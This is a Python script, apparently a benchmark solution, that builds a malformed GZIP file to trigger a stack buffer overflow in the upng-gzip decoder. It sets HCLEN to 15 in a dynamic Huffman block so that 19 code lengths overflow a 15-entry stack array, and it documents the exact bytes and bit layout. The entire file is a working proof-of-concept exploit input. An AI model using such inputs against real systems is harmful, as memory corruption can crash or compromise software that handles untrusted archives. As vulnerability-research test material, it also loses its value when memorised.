import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in upng-gzip.
        The vulnerability exists in the Huffman decoding where arrays for code lengths
        are sized to 15, but the Code Length alphabet allows up to 19 codes.
        
        We construct a GZIP file with a dynamic Huffman block where HCLEN is set to 15 (max),
        indicating 19 code lengths follow. This overflows the 15-byte stack buffer.
        """
        
        # GZIP Header (10 bytes)
        # ID1=0x1f, ID2=0x8b, CM=8 (Deflate), FLG=0, MTIME=0, XFL=0, OS=0
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
        
        # Deflate Block (9 bytes)
        # BFINAL=1, BTYPE=2 (Dynamic Huffman)
        # HLIT=0 (257 codes), HDIST=0 (1 code)
        # HCLEN=15 (implies 19 code lengths for CL tree)
        # 
        # Bitstream breakdown:
        # Byte 0 (0x05): 0000 0101 -> Bits: 1 (FINAL), 01 (TYPE=2), 00000 (HLIT=0)
        # Byte 1 (0xE0): 1110 0000 -> Bits: 00000 (HDIST=0), 111 (HCLEN low 3 bits)
        # Byte 2 (0x01): 0000 0001 -> Bits: 1 (HCLEN high bit -> HCLEN=15), 000... (Code lengths)
        # Bytes 3-8: 0x00 -> Provide remaining bits for code lengths to trigger overflow
        #
        # We need to provide enough bits to write past the 15th element.
        # 16th code write requires ~48 bits of codes. We provide 7 bits in byte 2 + 48 bits in bytes 3-8 = 55 bits.
        payload = b'\x05\xe0\x01\x00\x00\x00\x00\x00\x00'
        
        # GZIP Footer (8 bytes)
        # CRC32 (0), ISIZE (0)
        footer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        return header + payload + footer